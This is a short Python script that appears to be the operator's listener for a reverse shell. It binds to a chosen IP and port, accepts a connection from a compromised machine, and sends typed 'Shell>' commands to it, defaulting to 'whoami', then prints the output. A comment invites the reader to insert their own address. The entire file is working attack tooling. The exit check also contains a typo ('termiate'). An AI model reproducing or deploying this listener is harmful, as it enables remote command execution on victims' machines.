import socket

def connect():
  s = socket.socket()
  s.bind(('192.168.18.16', 8080)) #change ip and port to your ip and port you want
  s.listen(1)
  conn, addr = s.accept()
  print(f'[+] Connected with {addr}')

  while True:
    command = input('Shell> ')
    if command == '':
      command = 'whoami'

    elif 'termiate' in command:
      conn.send('terminate'.encode())
      conn.close()
      break
    else:
      conn.send(command.encode())
      print(conn.recv(1024).decode())

def main():
  connect()

main()